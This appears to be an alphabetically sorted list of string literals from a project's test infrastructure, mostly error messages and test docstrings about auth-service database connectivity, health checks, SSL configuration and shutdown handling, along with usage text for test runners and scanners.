    "EXPECTED TO FAIL - CRITICAL SERVER ERROR ISSUE\n        System should handle Auth Service 500 errors gracefully with retry/fallback\n        Root cause: No error handling when Auth Service returns 500 errors",
    "EXPECTED TO FAIL - CRITICAL SERVICE DOWN ISSUE\n        System should have fallback when Auth Service is completely unresponsive\n        Root cause: No fallback mechanism when Auth Service doesn't respond at all",
    "EXPECTED TO FAIL - CRITICAL SSL CERT EXPIRY ISSUE\n        System should handle Auth Service SSL certificate expiration gracefully\n        Root cause: No SSL certificate monitoring or graceful handling of certificate expiry",
    "Each hash should be unique",
    "Each password hash should be unique",
    "EdgeCaseTest123!",
    "Either --run-id or --workflow-name must be specified",
    "Emergency shutdown initiated",
    "Empty GOOGLE_CLIENT_ID not detected: '",
    "Empty GOOGLE_CLIENT_ID: '",
    "Empty GOOGLE_CLIENT_SECRET: '",
    "Empty OAUTH_HMAC_SECRET: '",
    "Empty code should be allowed (graceful handling)",
    "Empty function implementation found",
    "Empty user ID should handle gracefully",
    "Empty user information",
    "Empty values",
    "Enable continuous test generation in CI/CD pipeline",
    "Enable coverage reporting",
    "Enables real-time agent interactions for",
    "End-to-End Cold Start Test Suite for Netra Apex Platform\n\nThis comprehensive test validates the entire user flow from cold start through\nauthentication, WebSocket connection, chat interaction, and model response.\n\nCritical Path Tested:\n1. Dev launcher startup with all services\n2. Service discovery and dynamic port handling\n3. Auth service login (dev mode)\n4. Token retrieval and validation\n5. WebSocket connection with auth\n6. Chat message sending\n7. Model processing and response\n8. Clean shutdown\n\nAuthor: Netra Apex Engineering",
    "End-to-End Tests",
    "End-to-end integration tests",
    "End-to-end tests",
    "Endpoint",
    "Enforce maximum sessions per user",
    "Engine URL:",
    "Engine creation should succeed with valid staging credentials",
    "Engine:",
    "Enhanced Real Test Requirements Enforcer\n\nComprehensive validation and enforcement of SPEC/testing.xml real test requirements\nfor both Python and JavaScript test files.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Development Velocity, Risk Reduction  \n- Value Impact: Prevents regression bugs from invalid test patterns\n- Strategic Impact: Ensures test reliability, reduces debugging time, maintains system integrity\n\nSPEC Requirements Enforced:\n1. No mock component implementations inside test files\n2. Integration tests must use real child components\n3. Mock only external APIs and truly unavailable resources\n4. Test files must follow 450-line limit\n5. Test functions must follow 25-line limit\n6. Fix System Under Test first, not tests",
    "Enhanced Registry",
    "Enhanced Test Discovery Report",
    "Enhanced Test Discovery Report\nShows all test categories including real e2e tests prominently.",
    "Ensure OAuth redirect_uri uses _determine_urls()[0] (auth service)",
    "Ensure auth service is running for tests that require it",
    "Ensure auth_db is initialized for tests",
    "Ensure file is valid and accessible",
    "Environment '",
    "Environment async:",
    "Environment auto async",
    "Environment auto sync",
    "Environment expansion test - Service ID:",
    "Environment sync:",
    "Environment to test against (default: test)",
    "Environment variable case variant",
    "Environment variables set for real service testing",
    "Environment variables:",
    "Environment:",
    "Environment: DATABASE_URL=",
    "Environment: STAGING",
    "Error after deployment",
    "Error analyzing",
    "Error analyzing file",
    "Error checking",
    "Error checking git diff:",
    "Error checking size of",
    "Error decoding service token:",
    "Error details exposed:",
    "Error during fake test scanning:",
    "Error during validation (expected):",
    "Error during validation:",
    "Error fetching secret",
    "Error fixing",
    "Error fixing file:",
    "Error fixing mock component function in",
    "Error fixing parentheses in",
    "Error fixing test config:",
    "Error fixing test discovery:",
    "Error killing process",
    "Error levels within acceptable limits",
    "Error loading Jest coverage:",
    "Error loading Python coverage:",
    "Error loading test results:",
    "Error parsing test file",
    "Error processing",
    "Error rate reduced from 2.3% to 0.8%.",
    "Error reading",
    "Error reading file",
    "Error reading file:",
    "Error reading test file",
    "Error reducing mocking in",
    "Error running validator:",
    "Error scanning",
    "Error score:",
    "Error should mention URL problem for input:",
    "Error should mention database connection issue:",
    "Error splitting",
    "Error splitting file",
    "Error splitting function",
    "Error starting development server:",
    "Error stopping development server:",
    "Error type:",
    "Error updating",
    "Error:",
    "Error: Could not find tests/e2e directory. Make sure script is run from project root.",
    "Error: File",
    "Error: Frontend directory not found at",
    "Error: test_categorization.json not found. Run categorize_tests.py first.",
    "Errors Encountered:",
    "Errors encountered:",
    "Errors:",
    "Est. Duration:",
    "Estimated Duration:",
    "Example Message Flow Test Runner",
    "Example Message Flow system is ready for production.",
    "Example file not found!",
    "Example file:",
    "Example refactoring:",
    "Example split:",
    "Examples demonstrated:",
    "Examples:\n  # Run all Jest tests\n  python unified_test_runner.py --service frontend\n  \n  # Run specific category\n  python unified_test_runner.py --service frontend --category components\n  python unified_test_runner.py --service frontend --category hooks\n  \n  # Run with coverage\n  python unified_test_runner.py --service frontend --coverage\n  \n  # Run E2E tests with Cypress\n  python unified_test_runner.py --service frontend --e2e\n  python unified_test_runner.py --service frontend --cypress-open\n  \n  # Run specific test file\n  python unified_test_runner.py --service frontend components/Button.test.tsx\n  \n  # Watch mode for development\n  python unified_test_runner.py --service frontend --watch\n  \n  # Full CI/CD run\n  python unified_test_runner.py --service frontend --lint --type-check --coverage --build",
    "Examples:\n  # Run all tests\n  python unified_test_runner.py --service backend\n  \n  # Run specific category\n  python unified_test_runner.py --service backend --category unit\n  python unified_test_runner.py --service backend --category agent",
    "Examples:\n  python scripts/compliance/fake_test_scanner.py --scan-all\n  python scripts/compliance/fake_test_scanner.py --directory app/tests\n  python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n  python scripts/compliance/fake_test_scanner.py --report-only --format json",
    "Examples:\n  python scripts/test_imports.py                  # Quick critical import test\n  python scripts/test_imports.py --all            # Comprehensive import test\n  python scripts/test_imports.py --verbose        # Show detailed output\n  python scripts/test_imports.py --json report.json  # Save JSON report",
    "Examples:\n  python test_refactor_helper.py analyze app/tests/test_large.py\n  python test_refactor_helper.py suggest app/tests/test_large.py --strategy category\n  python test_refactor_helper.py validate app/tests/test_large.py",
    "Examples:\n  python test_size_validator.py                    # Validate all tests\n  python test_size_validator.py --format json     # JSON output\n  python test_size_validator.py --format markdown # Markdown output\n  python test_size_validator.py --output report.md # Save to file\n  python test_size_validator.py --auto-split      # Auto-split violations",
    "Exception in",
    "Exception:",
    "Exclude tests for specific environment",
    "Execute tests with full optimization pipeline",
    "Executing category:",
    "Execution Phases:",
    "Execution failed",
    "Expected",
    "Expected 'auth-service' in X-Service-Name header, got:",
    "Expected 'auth-service' in response, got:",
    "Expected 'auth-service', got '",
    "Expected 'cloud_sql' type, got '",
    "Expected 'postgres' in URL:",
    "Expected 'postgres' user, got '",
    "Expected 'postgres' username, got '",
    "Expected 'staging mode' in logs, got:",
    "Expected 'staging' environment, got '",
    "Expected 'user_pr-4' in URL:",
    "Expected /auth/github endpoint for GitHub OAuth, got:",
    "Expected /auth/google endpoint to exist, got status:",
    "Expected /oauth/config endpoint to exist, got status:",
    "Expected /oauth/providers endpoint, got status:",
    "Expected CORS header",
    "Expected GitHub OAuth redirect, got:",
    "Expected Google OAuth redirect, got location:",
    "Expected Google in providers list, got:",
    "Expected OAuth provider config, got:",
    "Expected SQLite URL, got:",
    "Expected SQLite engine, got:",
    "Expected SQLite or empty URL during tests, got:",
    "Expected SSL-related error, got:",
    "Expected SSL:",
    "Expected STAGING, got",
    "Expected WebSocket auth endpoint to exist, got:",
    "Expected asyncpg driver in URL, got:",
    "Expected asyncpg format, got:",
    "Expected auth service:",
    "Expected authentication error, got:",
    "Expected callback endpoint to exist (even if params invalid), got:",
    "Expected error code '",
    "Expected event type '",
    "Expected exit code:",
    "Expected high usage warning, got:",
    "Expected initialization to fail with mocked exception",
    "Expected providers list, got:",
    "Expected ssl=require parameter, got:",
    "Expected staging client ID 'staging-client-id-12345', but got: '",
    "Expected staging client ID in config, got:",
    "Expected staging client secret, but got: '",
    "Expected staging domain in callback URL, got:",
    "Expected staging frontend URL, got:",
    "Expected staging service ID in token, got:",
    "Expected status",
    "Expected success=",
    "Expected token to be expired, but it's valid",
    "Expected token_type 'Bearer', got '",
    "Expected user_id '",
    "Expected valid:",
    "Expired ID token should be rejected",
    "Expired state parameters should be rejected",
    "FAIL",
    "FAIL: Auth service not properly configured to skip .env loading",
    "FAIL: Backend app not properly configured to skip .env loading",
    "FAIL: Deployment script missing configurations:",
    "FAIL: Found",
    "FAIL: Test failed with error:",
    "FAILED",
    "FAILED (",
    "FAILED FILES (",
    "FAILED TESTS:",
    "FAILED:",
    "FAILED: Alembic connection failed",
    "FAILED: AuthConfig URL connection failed:",
    "FAILED: AuthConfig URL has incorrect format",
    "FAILED: AuthConfig test failed:",
    "FAILED: Cannot import AuthDatabaseManager:",
    "FAILED: Configuration validation failed:",
    "FAILED: Could not generate migration URL",
    "FAILED: Could not rename",
    "FAILED: Credential validation error:",
    "FAILED: Credential validation failed",
    "FAILED: DatabaseURLBuilder test failed:",
    "FAILED: Direct asyncpg connection failed:",
    "FAILED: No database URL generated",
    "FAILED: No database URL generated by AuthConfig",
    "FAILED: TCP connection failed (expected):",
    "FAILED: URL generation failed:",
    "FAILED: URL missing expected components:",
    "FAILED: URLs missing expected Cloud SQL patterns",
    "FAILED: Unexpected URL format:",
    "FAILED\\s+([\\w/\\.]+::\\w+)",
    "FAILING TEST ANALYSIS:",
    "FAILING TEST: /health endpoint basic health doesn't check database connectivity.\n        \n        The health endpoint in main.py returns basic health info without validating\n        that the database is actually accessible.",
    "FAILING TEST: Alembic database migrations fail when postgres database doesn't exist.\n        \n        Database migrations should fail clearly when the target database is unavailable,\n        not partially execute or leave the schema in an inconsistent state.",
    "FAILING TEST: Authentication operations fail silently when database is unavailable.\n        \n        In degraded state, authentication operations should fail with clear error\n        messages that explain the service is temporarily limited.",
    "FAILING TEST: Automated vulnerability scanners can extract system information.\n        \n        Common vulnerability scanners should not be able to extract detailed\n        system information from error responses when database is broken.",
    "FAILING TEST: Connection events fail to detect postgres database existence issues.\n        \n        Database connection events should detect and handle database existence\n        validation, not just connection parameter validation.",
    "FAILING TEST: Connection pool fails to initialize when postgres database doesn't exist.\n        \n        Connection pool should fail fast when target database is not available,\n        rather than creating a pool that will fail on every connection attempt.",
    "FAILING TEST: Connection pool fails to recover after postgres database is fixed.\n        \n        Even after the postgres database issue is resolved, the connection pool\n        might retain invalid connections and fail to recover properly.",
    "FAILING TEST: Connection pool gets exhausted during repeated postgres connection attempts.\n        \n        When the service repeatedly tries to connect to non-existent postgres database,\n        it can exhaust the connection pool and make the service completely unavailable.",
    "FAILING TEST: DoS attacks through database error amplification when DB is broken.\n        \n        When database is broken, repeated requests might cause resource exhaustion\n        through error handling or connection retry attempts.",
    "FAILING TEST: Documents the problematic graceful degradation behavior.\n        \n        This test verifies that when the database connection fails, the service \n        incorrectly continues with \"reduced functionality\" instead of properly\n        handling the database error and reporting unhealthy status.",
    "FAILING TEST: Graceful degradation behavior is not appropriate for the environment.\n        \n        Different environments should have different degradation policies.\n        Production should fail fast, development might allow degraded operation.",
    "FAILING TEST: Health check doesn't detect cascade failures from database issues.\n        \n        When database connectivity fails, it can cause cascade failures in other\n        system components. Health checks should detect these patterns.",
    "FAILING TEST: Health check doesn't detect gradual database performance degradation.\n        \n        Health checks should detect when database performance is degrading,\n        which might indicate connection issues or resource constraints.",
    "FAILING TEST: Health check doesn't validate database migration state.\n        \n        Health checks should verify that database migrations are up to date\n        and the schema version matches application expectations.",
    "FAILING TEST: Health check doesn't validate database schema integrity.\n        \n        Health checks should verify that required database tables and schema\n        are available and properly structured.",
    "FAILING TEST: Health check doesn't validate database transaction capabilities.\n        \n        Health checks should verify that database can handle transactions properly,\n        not just basic connectivity.",
    "FAILING TEST: Health check doesn't validate recovery from database issues.\n        \n        After database connectivity is restored, health checks should validate\n        that all dependent systems have properly recovered.",
    "FAILING TEST: Health check system lacks comprehensive database connectivity validation.\n        \n        The health check system should validate all critical database connections\n        before reporting healthy status.",
    "FAILING TEST: Health checks don't properly indicate when service is in degraded state.\n        \n        Health checks should clearly distinguish between healthy, degraded, and unhealthy states.",
    "FAILING TEST: Health endpoint should validate database connectivity before reporting healthy.\n        \n        The /health endpoint should check if the database is actually accessible\n        before reporting healthy status, especially for critical databases like netra_dev.",
    "FAILING TEST: Load balancer can't make proper routing decisions for degraded instances.\n        \n        Load balancers need to know when an instance is degraded so they can\n        route traffic appropriately or remove the instance from rotation.",
    "FAILING TEST: Log injection attacks possible through database error messages.\n        \n        Malicious input in requests might be reflected in database error messages\n        and then logged, potentially causing log injection vulnerabilities.",
    "FAILING TEST: Monitoring systems can't properly detect degraded functionality.\n        \n        External monitoring systems need clear indicators to distinguish between\n        healthy, degraded, and failed states.",
    "FAILING TEST: Readiness endpoint bypasses database validation in development mode.\n        \n        The /health/ready endpoint has problematic logic that allows ready status\n        in development mode even when database validation fails.",
    "FAILING TEST: Readiness endpoint should fail when database is unavailable.\n        \n        The /health/ready endpoint should properly detect when netra_dev database\n        is not accessible and return not ready status.",
    "FAILING TEST: Real integration test that attempts database connection with invalid credentials.\n        \n        This test actually tries to connect to a database with invalid credentials,\n        replicating the exact failure scenario from production logs.",
    "FAILING TEST: Recovery from degraded state is not properly detected or communicated.\n        \n        When database connectivity is restored, the system should detect this\n        and clearly communicate that full functionality is restored.",
    "FAILING TEST: Replicates 'Shutdown timeout exceeded' warnings.\n        \n        This test demonstrates how database connections that fail to close\n        within the timeout period cause shutdown warnings and resource leaks.",
    "FAILING TEST: Replicates 'database \"netra_staging\" does not exist' error.\n        \n        This is the primary critical error found in staging logs where the auth service\n        attempts to connect to a database named \"netra_staging\" that doesn't exist.",
    "FAILING TEST: Replicates SHUTDOWN_TIMEOUT_SECONDS being ignored in staging.\n        \n        The staging environment might not respect the SHUTDOWN_TIMEOUT_SECONDS\n        configuration, causing shutdowns to exceed Cloud Run's termination window.",
    "FAILING TEST: Replicates shutdown timeout exceeded warnings.\n        \n        This test demonstrates how database connections that fail to close\n        properly can cause shutdown timeouts, as seen in production logs.",
    "FAILING TEST: Replicates socket closure errors during cleanup operations.\n        \n        This test demonstrates how socket connections that are already closed\n        or in an invalid state cause errors during the cleanup process.",
    "FAILING TEST: Replicates socket closure issues during shutdown.\n        \n        This test demonstrates how failed database connections can cause\n        socket closure errors during application shutdown, as seen in logs.",
    "FAILING TEST: Replicates table creation failure due to authentication issues.\n        \n        This test demonstrates how authentication failures prevent table creation,\n        leading to the \"Table creation being skipped\" warnings in logs.",
    "FAILING TEST: Replicates the exact 'database netra_dev does not exist' error.\n        \n        This is the primary critical error where the auth service attempts to connect \n        to the 'netra_dev' database that doesn't exist in the staging environment.",
    "FAILING TEST: Replicates the exact 'database postgres does not exist' error.\n        \n        This is the primary critical error found in iteration 2 where the auth service\n        attempts to connect to the default 'postgres' database that doesn't exist.",
    "FAILING TEST: Schema validation fails when postgres database doesn't exist.\n        \n        Schema validation should detect that required tables don't exist because\n        the target database is unavailable.",
    "FAILING TEST: Security bypasses possible when authentication database is broken.\n        \n        When authentication database is unavailable, security validations might\n        be bypassed or weakened, creating security vulnerabilities.",
    "FAILING TEST: Security scans might expose detailed database error information.\n        \n        When database is broken (netra_dev doesn't exist), security scan attempts\n        should not receive detailed error information that could be useful to attackers.",
    "FAILING TEST: Service starts with database unavailable but doesn't clearly indicate degraded state.\n        \n        When database is unavailable, service should either fail to start OR clearly\n        indicate degraded functionality to users and monitoring systems.",
    "FAILING TEST: Shows regular PostgreSQL SSL parameter conversion issues.\n        \n        Root Cause: Auth service incorrectly handles SSL parameter conversion \n        for non-Cloud SQL connections.",
    "FAILING TEST: Shows staging deployment SSL configuration mismatch.\n        \n        Root Cause: Staging deployment configures sslmode=require in DATABASE_URL \n        but auth service expects no SSL parameters for Cloud SQL.",
    "FAILING TEST: Table creation fails silently when postgres database doesn't exist.\n        \n        Table creation should fail loudly when the target database is not available,\n        not fail silently and leave the service in an inconsistent state.",
    "FAILING TEST: Tests Cloud Run SIGTERM handling timeout in staging.\n        \n        Cloud Run sends SIGTERM and gives ~10 seconds before SIGKILL. The service\n        should handle this gracefully within the allotted time.",
    "FAILING TEST: Tests Cloud SQL database name resolution failures.\n        \n        Cloud SQL might have different database naming conventions that cause\n        the \"netra_staging does not exist\" error.",
    "FAILING TEST: Tests Redis session cleanup hanging during service shutdown.\n        \n        Redis connections for session management might hang during cleanup,\n        preventing graceful shutdown within timeout limits.",
    "FAILING TEST: Tests SIGTERM signal handler timeout in staging deployment.\n        \n        The service should handle SIGTERM within a reasonable time frame,\n        but might hang on cleanup operations in staging.",
    "FAILING TEST: Tests SSL connection failures to Cloud SQL in staging.\n        \n        SSL configuration issues can cause connection failures even when\n        database name is correct.",
    "FAILING TEST: Tests background task cancellation during auth failures.\n        \n        This test demonstrates how background database operations may not\n        be properly cancelled when authentication failures occur during shutdown.",
    "FAILING TEST: Tests cascade shutdown failures when database issues affect multiple services.\n        \n        This test demonstrates how database shutdown issues in the auth service\n        can cascade to affect other services that depend on authentication.",
    "FAILING TEST: Tests connection pool disposal failures during shutdown.\n        \n        This test demonstrates how connection pools may not be properly\n        disposed of during shutdown, leading to resource leaks.",
    "FAILING TEST: Tests connection pool exhaustion during authentication retries.\n        \n        This test demonstrates how repeated authentication failures can exhaust\n        the connection pool, leading to service unavailability.",
    "FAILING TEST: Tests connection retry behavior with persistent auth failures.\n        \n        This test demonstrates how authentication failures persist across retry attempts,\n        leading to complete connection failure and service unavailability.",
    "FAILING TEST: Tests database connection pools hanging during staging shutdown.\n        \n        Connection pools in staging might have connections that don't close properly,\n        causing shutdown timeouts.",
    "FAILING TEST: Tests database connection timeouts during auth service initialization.\n        \n        Connection timeouts during startup can prevent the auth service from starting.",
    "FAILING TEST: Tests database name configuration mismatches that cause similar errors.\n        \n        Related to the netra_staging issue - tests various database name misconfigurations\n        that could cause \"does not exist\" errors.",
    "FAILING TEST: Tests handling of security scan attempts when database is broken.\n        \n        When database connectivity is broken (netra_dev doesn't exist), security\n        scan attempts should be handled gracefully without exposing system issues.",
    "FAILING TEST: Tests multiple connection failures during service startup.\n        \n        This replicates scenarios where the auth service fails to initialize\n        database connections multiple times, causing startup failures.",
    "FAILING TEST: Tests service startup without comprehensive credential validation.\n        \n        This test demonstrates how the service can start up without validating\n        that the provided credentials actually work for database operations.",
    "FAILING TEST: Tests session creation when underlying credentials are invalid.\n        \n        This test demonstrates how session creation can appear to succeed\n        but fail during actual database operations due to authentication issues.",
    "FAILING TEST: Tests shutdown timeout issues when database connections are broken.\n        \n        When database connections are broken (netra_dev doesn't exist), the shutdown\n        process should not hang due to trying to close non-existent connections.",
    "FAILING TEST: Tests signal handling during active database operations.\n        \n        This test demonstrates how the service may not handle termination\n        signals gracefully when database operations are in progress.",
    "FAILING TEST: Tests that connection events don't properly handle auth failures.\n        \n        This test demonstrates how database connection events may not\n        properly detect and handle authentication failures.",
    "FAILING TEST: Tests that database validation is not properly enforced during initialization.\n        \n        This test demonstrates how the current initialization process can succeed\n        even when database credentials are invalid, leading to runtime failures.",
    "FAILING TEST: Tests that repeated authentication failures aren't handled gracefully.\n        \n        This test demonstrates how the service doesn't implement proper\n        backoff or circuit breaker patterns for authentication failures.",
    "FAILING TEST: Tests that service startup incorrectly continues despite database failure.\n        \n        This replicates the behavior from main.py lifespan function where the service\n        starts even when database initialization fails in development/staging.",
    "FAILING TEST: Tests that shutdown timeouts are not properly configurable or respected.\n        \n        This test demonstrates how hardcoded or improperly configured shutdown\n        timeouts can cause issues in different deployment environments.",
    "FAILING TEST: Tests that table creation failures are not properly handled.\n        \n        This replicates the scenario where table creation is skipped due to\n        authentication errors, but the service continues to operate incorrectly.",
    "FAILING TEST: Tests the 'postgres' database error specifically in Cloud SQL context.\n        \n        Cloud SQL environments might be defaulting to 'postgres' database name\n        instead of using the correct application database.",
    "FAILING TEST: Tests the problematic 'staging mode' fallback when database is unavailable.\n        \n        This test verifies that when the database connection fails, the service incorrectly\n        falls back to 'staging mode' instead of properly handling the database error.",
    "FAILING TEST: Tests token validation when database connectivity is broken.\n        \n        When 'netra_dev' database doesn't exist, token validation operations\n        should fail gracefully rather than causing service errors.",
    "FAILING TEST: User requests get confusing or misleading responses in degraded state.\n        \n        When service is degraded, user-facing responses should be clear about\n        what functionality is available and what is temporarily unavailable.",
    "FAILING TEST: Verifies that database URL construction creates invalid netra_dev references.\n        \n        This test identifies where the problematic database name 'netra_dev' \n        is coming from in the URL construction process.",
    "FAILING TEST: Verifies that health checks don't properly validate database connectivity.\n        \n        This test exposes that the health endpoint returns healthy status even when\n        the database connection is failing due to 'netra_dev' not existing.",
    "FAILING TEST: Verifies that health checks fail when postgres database doesn't exist.\n        \n        Health checks should properly detect and report database connectivity issues\n        instead of allowing the service to appear healthy.",
    "FAILING TEST: Verifies that token storage fails when database 'postgres' doesn't exist.\n        \n        Token storage is critical for authentication - it must fail gracefully\n        when the database is unavailable.",
    "FAILING TEST: Verifies that user creation fails when database 'postgres' doesn't exist.\n        \n        This test ensures that core authentication features like user creation\n        properly fail when the database is unavailable.",
    "FAILING TESTS: Database 'netra_dev' Does Not Exist - Critical Issue from Iteration 3\n\nCRITICAL DATABASE CONNECTIVITY ISSUE TO REPLICATE:\n- Database connection failing with: \"database 'netra_dev' does not exist\"\n- Service continues with reduced functionality (graceful degradation)\n- Health checks don't validate database connectivity properly\n- Service reports healthy despite database being unavailable\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Database reliability and connection validation \n- Value Impact: Ensures authentication system operates with proper database connectivity\n- Strategic Impact: Prevents authentication failures that compromise all customer tiers\n\nThese tests are designed to FAIL with the current system state and PASS once the database\nconnectivity and health check issues are properly resolved.",
    "FAILING TESTS: Database 'postgres' Does Not Exist - Critical Issue from Iteration 2\n\nCRITICAL NEW DATABASE ISSUE TO REPLICATE:\n- Database connection failing with: \"database 'postgres' does not exist\"\n- Service falls back to \"staging mode\" without database connectivity\n- This compromises all database-dependent features including user creation, token storage, authentication\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Database reliability and connection stability\n- Value Impact: Ensures authentication system functionality across all environments\n- Strategic Impact: Prevents authentication failures that would block all customer tiers\n\nThese tests are designed to FAIL with the current system state and PASS once the database\nnaming and connectivity issue is properly resolved.",
    "FAILING TESTS: Database Connection Pool and Table Initialization Failures\n\nCRITICAL CONNECTION POOL ISSUES RELATED TO 'postgres' DATABASE ERROR:\n- Connection pool initialization fails when database 'postgres' doesn't exist\n- Table creation attempts fail, but service continues in degraded mode\n- Connection pool exhaustion during repeated authentication failures\n- Connection events not properly handling database existence validation\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Reliable connection pooling and database schema management\n- Value Impact: Ensures stable database connectivity and proper error handling\n- Strategic Impact: Prevents service degradation and silent failures\n\nThese tests focus on connection pool management and table initialization \nissues specifically related to the 'postgres' database connectivity problem.",
    "FAILING TESTS: Graceful Degradation Problems - Critical Issue from Iteration 3\n\nCRITICAL GRACEFUL DEGRADATION ISSUE TO REPLICATE:\n- Service continues with \"reduced functionality\" when database is unavailable\n- No clear indication to users that critical features are non-functional\n- Authentication operations fail silently or with unclear error messages\n- System appears healthy from external perspective despite internal failures\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Reliable service behavior and clear failure communication\n- Value Impact: Ensures users understand service limitations during degraded states\n- Strategic Impact: Prevents user confusion and support burden during outages\n\nThese tests are designed to FAIL with the current system state and PASS once graceful\ndegradation is properly implemented with clear user communication and proper failure handling.",
    "FAILING TESTS: Health Check Database Validation - Critical Issue from Iteration 3\n\nCRITICAL HEALTH CHECK VALIDATION ISSUE TO REPLICATE:\n- Health checks report healthy despite database connectivity failures\n- Service continues to operate without proper database validation\n- No early detection of database issues like \"netra_dev does not exist\"\n- Readiness checks don't properly validate database accessibility\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal  \n- Business Goal: Reliable health monitoring and early issue detection\n- Value Impact: Prevents service degradation by detecting database issues early\n- Strategic Impact: Enables proper load balancer and orchestrator decision making\n\nThese tests are designed to FAIL with the current system state and PASS once health\ncheck database validation is properly implemented.",
    "FAILING TESTS: Security Scan Handling with Broken Database - Critical Issue from Iteration 3\n\nCRITICAL SECURITY EXPOSURE ISSUE TO REPLICATE:\n- Security scan attempts when database is unavailable may expose internal errors\n- Error messages might leak system information to potential attackers\n- Broken database state could bypass security validations\n- Service continues responding to requests despite being in compromised state\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Security and information disclosure prevention\n- Value Impact: Prevents exposure of internal system details to attackers\n- Strategic Impact: Maintains security posture even during service degradation\n\nThese tests are designed to FAIL with the current system state and PASS once security\nscan handling is properly implemented for degraded database states.",
    "FAILURE:",
    "FAILURE: Multiple connection tests failed",
    "FAILURE: URL construction has issues",
    "FAKE TEST ANALYSIS:",
    "FATAL:",
    "FATAL: password authentication failed for user 'postgres'",
    "FERNET_KEY",
    "FINAL SUMMARY",
    "FIXED TEST: Verifies that Cloud SQL sslmode parameters are properly removed.\n        \n        Root Cause: asyncpg doesn't recognize 'sslmode' parameter for Unix socket \n        connections to Cloud SQL. SSL parameters should be completely removed.",
    "FIXED_SESSION_12345",
    "FIXES APPLIED (",
    "FIXING ALL TEST ISSUES",
    "FIXING COMMON TEST ISSUES",
    "FRONTEND_PORT",
    "FRONTEND_URL",
    "Factory compliance does not default to staging",
    "Factory status integration does not default to staging",
    "Fail Fast:",
    "Fail on any violations (for CI)",
    "Fail-fast policy violated with behavior:",
    "Fail-fast strategy mode (default: category_failure)",
    "Failed",
    "Failed for",
    "Failed for case '",
    "Failed renames:",
    "Failed tests:",
    "Failed to analyze",
    "Failed to backup",
    "Failed to convert",
    "Failed to create",
    "Failed to create backup for",
    "Failed to create thread:",
    "Failed to detect staging URL issue:",
    "Failed to fix:",
    "Failed to import auth_core modules:",
    "Failed to import optimization modules:",
    "Failed to install dependencies:",
    "Failed to kill PID",
    "Failed to load violations file:",
    "Failed to normalize",
    "Failed to parse LLM response",
    "Failed to parse file",
    "Failed to process",
    "Failed to read",
    "Failed to reject SQL injection in password:",
    "Failed to reject SQL injection:",
    "Failed to remove original file:",
    "Failed to send message:",
    "Failed to split function",
    "Failed to start Docker services",
    "Failed to start auth service:",
    "Failed to start services:",
    "Failed to update test:",
    "Failed to validate",
    "Failed to validate sync",
    "Failed:",
    "FailingAgent",
    "Failure rate:",
    "Fake Test Scan Results:",
    "Fake Test Scanner - Comprehensive fake test detection and reporting\n\n**BUSINESS VALUE JUSTIFICATION (BVJ):**\n1. **Segment**: Platform/Internal - Quality assurance for all tiers\n2. **Business Goal**: Platform Stability, Development Velocity, Risk Reduction\n3. **Value Impact**: Prevents false confidence from fake tests, improves reliability\n4. **Strategic Impact**: Reduces debugging time, accelerates issue resolution\n5. **Platform Stability**: Ensures all tests provide real validation\n\nThis script provides comprehensive fake test detection across the entire codebase.\nIt integrates with existing test infrastructure and generates actionable reports.\n\nUsage:\n    python scripts/compliance/fake_test_scanner.py --scan-all\n    python scripts/compliance/fake_test_scanner.py --directory app/tests\n    python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n    python scripts/compliance/fake_test_scanner.py --report-only",
    "Fake Tests by Severity:",
    "Fake Tests by Type:",
    "Fallback Mode (Execution Failed)",
    "Fallback to standard test execution",
    "Falling back to standard test runner...",
    "Fast-fail import testing for Netra Backend",
    "Fast-fail import testing script for Netra Backend\n\nThis script provides quick import validation to catch import errors\nearly in the development cycle. It can be run standalone or integrated\ninto CI/CD pipelines.\n\nUsage:\n    python scripts/test_imports.py              # Test critical imports (fast-fail)\n    python scripts/test_imports.py --all        # Test all imports\n    python scripts/test_imports.py --module app.services  # Test specific module",
    "Fast-fail triggered by category:",
    "Fatal error:",
    "Feature grouping is heuristic - review carefully",
    "Feature integration tests (3-5min)",
    "Fernet Key:",
    "Fernet Key: MISSING",
    "Fernet Key: OK - Configured (from",
    "Field(default=\"staging\"",
    "File",
    "File \"",
    "File \"([^\"]+\\.py)\"",
    "File does not exist:",
    "File has",
    "File not found:",
    "File size:",
    "File:",
    "Files Affected:",
    "Files exceeding",
    "Files fixed:",
    "Files modified:",
    "Files processed:",
    "Files split:",
    "Files successfully fixed:",
    "Files that failed to fix:",
    "Files with Violations:",
    "Files with import errors:",
    "Files with import order issues:",
    "Final Result:",
    "Final Summary",
    "First access token should be valid",
    "First allocation failed:",
    "First database initialization failed:",
    "First database initialization should succeed",
    "First nonce use should be allowed",
    "First state validation should succeed",
    "First table creation failed:",
    "First use of auth code should be allowed",
    "First use of authorization code should succeed",
    "First use should be allowed",
    "First use should be allowed for",
    "First use should succeed",
    "Five Whys Reproduction Tests for Auth Service Staging Errors.\nReproduces each root cause identified in the Five Whys analysis.",
    "Fix #",
    "Fix Authentication Test Tokens\n\nThis script fixes the authentication integration tests by replacing invalid\ntoken strings with properly formatted JWT tokens.\n\nBusiness Value Justification (BVJ):\n- Segment: Platform/Internal\n- Business Goal: Fix authentication tests to pass with proper JWT tokens\n- Value Impact: Enables authentication system validation and reliability\n- Strategic Impact: Prevents authentication regressions",
    "Fix Python syntax errors",
    "Fix TestSyntaxFix classes that have __init__ constructors in test files.\n\nPytest doesn't allow test classes to have __init__ constructors.\nThis script converts them to use setup_method instead.",
    "Fix all test issues including syntax errors and size violations.",
    "Fix common test issues in the Netra codebase.",
    "Fix detected stubs (not implemented)",
    "Fix mock component function in",
    "Fix required: Change _determine_urls()[1] to _determine_urls()[0] in auth_routes.py",
    "Fix test_utils import errors in test files.\n\nThis script fixes the incorrect import:\n    from netra_backend.tests.test_utils import setup_test_path\n    \nAnd removes it since it's not needed (tests should be run from proper context).",
    "Fix the failing test:",
    "Fix the import order in test files to ensure setup_test_path() is called first.",
    "Fix:",
